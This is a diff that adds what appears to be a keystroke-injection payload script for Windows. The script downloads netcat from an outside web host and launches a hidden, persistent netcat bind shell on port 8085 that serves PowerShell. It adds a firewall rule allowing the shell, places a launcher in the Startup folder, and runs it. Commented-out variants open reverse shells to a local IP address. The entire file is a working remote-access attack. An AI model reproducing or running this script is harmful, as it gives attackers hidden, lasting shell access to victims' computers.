@@ -1,0 +1,41 @@
+::OS Windows
+::REM Netcat bind shell
+::TERM
+$temp = $env:TEMP
+$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\StartUp"
+cd $temp
+
+TASKKILL /im nc.exe /f
+erase nc.exe
+erase start.ps1
+erase "$startup\start.ps1"
+::REM Async download
+::DELAY 500
+Invoke-WebRequest 'https://www.cse.unsw.edu.au/~z3419746/nc.exe' -OutFile 'nc.exe'
+::DELAY 3000
+
+::REM -L is windows only, persistent listen
+"start-process powershell -windowstyle hidden `"$env:TEMP\nc.exe -lp 8085 -e powershell -L`"" | out-file start.ps1
+
+netsh advfirewall firewall add rule name='Netcat' dir=in action=allow program="$temp\nc.exe" enable=yes
+
+move 'start.ps1' "$startup"
+& "$startup\start.ps1"
+exit
+
+
+::REM ::OS Windows
+::REM ::TERM
+::REM ::REM $desktop = [Environment]::GetFolderPath('desktop')
+::REM ::REM cd $desktop
+::REM cd $env:TEMP
+::REM wget 'https://www.cse.unsw.edu.au/~z3419746/nc.exe' -OutFile nc.exe
+::REM ::DELAY 4000
+::REM start-process nc.exe '192.168.0.11 8085 -e powershell.exe -d'; exit
+::REM start-process nc.exe '-lp 8085 -e powershell.exe -d'; exit
+
+
+::REM ::OS Windows
+::REM ::RUN cmd
+::REM cd %userprofile%\desktop
+::REM START /MIN nc_win.exe 192.168.0.11 8085 -e powershell.exe -d & exit
